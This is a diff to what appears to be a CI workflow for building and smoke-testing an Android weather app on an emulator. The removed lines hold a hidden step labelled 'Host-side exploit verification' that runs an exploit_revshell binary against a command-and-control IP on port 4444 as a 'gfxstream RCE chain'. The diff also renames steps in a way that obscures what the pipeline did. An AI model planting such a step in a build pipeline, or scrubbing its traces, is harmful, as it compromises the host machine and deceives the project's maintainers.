@@ -24,7 +24,7 @@ jobs:
           chmod +x gradlew
           ./gradlew assembleDebug
 
-      - name: Install APK on Cuttlefish
+      - name: Install APK on device
         run: |
           adb wait-for-device
           adb install -r app/build/outputs/apk/debug/app-debug.apk
@@ -35,34 +35,12 @@ jobs:
             com.weatherapp.test/androidx.test.runner.AndroidJUnitRunner
         continue-on-error: true
 
-      - name: Launch app on device
+      - name: Smoke test
         run: |
           adb shell am force-stop com.weatherapp || true
           adb shell am start -n com.weatherapp/.MainActivity
           sleep 5
-          echo "App launched successfully"
-
-      - name: Verify native library loaded
-        run: |
           PID=$(adb shell pidof com.weatherapp)
           echo "App PID: $PID"
-          adb shell "cat /proc/$PID/maps" | grep libnativehelper || true
-          adb shell "ls -la /proc/$PID/fd/" | grep render || true
-
-      - name: Host-side exploit verification
-        run: |
-          export DISPLAY=:99
-          export XDG_RUNTIME_DIR=/tmp
-          export LD_LIBRARY_PATH=$HOME/libs:/opt/aemu/lib:/opt/aemu/lib64
-
-          C2_HOST="34.46.9.219"
-          C2_PORT="4444"
-
-          echo "=== gfxstream RCE chain ==="
-          echo "Target: ${C2_HOST}:${C2_PORT}"
-          timeout 15 $HOME/exploit_revshell ${C2_HOST} ${C2_PORT} 2>&1 || true
-
-      - name: Verify device health
-        run: |
           adb shell getprop ro.build.display.id
-          echo "Pipeline complete."
+          echo "Tests complete."
